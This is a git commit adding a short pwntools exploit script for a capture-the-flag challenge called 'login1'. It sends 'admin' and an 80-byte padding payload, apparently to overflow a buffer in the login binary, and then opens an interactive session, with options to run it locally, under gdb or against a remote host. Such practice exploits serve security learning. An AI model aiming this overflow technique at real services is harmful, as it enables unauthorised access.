4432b3fa19db9a54bf03950d081aad657e4d5962
t3mp-0xCC <40132263+t3mp-0xCC@users.noreply.github.com>
2022-11-09 19:41:43 +0900

    add: malleus_ctf login1

---
+++ malleus_ctf/login1/exp.py
@@ -0,0 +1,36 @@
+#!/usr/bin/env python3
+# -*- coding:utf-8 -*
+
+from pwn import *
+from sys import argv
+from time import sleep
+
+context.terminal = ['tmux', 'sp', '-h']
+context.log_level = "debug"
+
+chall = "./login1"
+#libc = ELF()
+elf = ELF(chall)
+context.binary = chall
+context.binary.checksec()
+
+if len(argv) >= 2 and argv[1] == "r":
+    p = remote("example.com", 4444)
+elif len(argv) >= 2 and argv[1] == "d":
+	cmd = """
+		b main
+		c
+	"""
+	p = gdb.debug(chall,cmd)
+else:
+    p = process(chall)
+
+
+payload = b"A" * 0x50
+
+p.recvuntil(":")
+p.sendline("admin")
+p.recvuntil(":")
+p.sendline(payload)
+
+p.interactive()
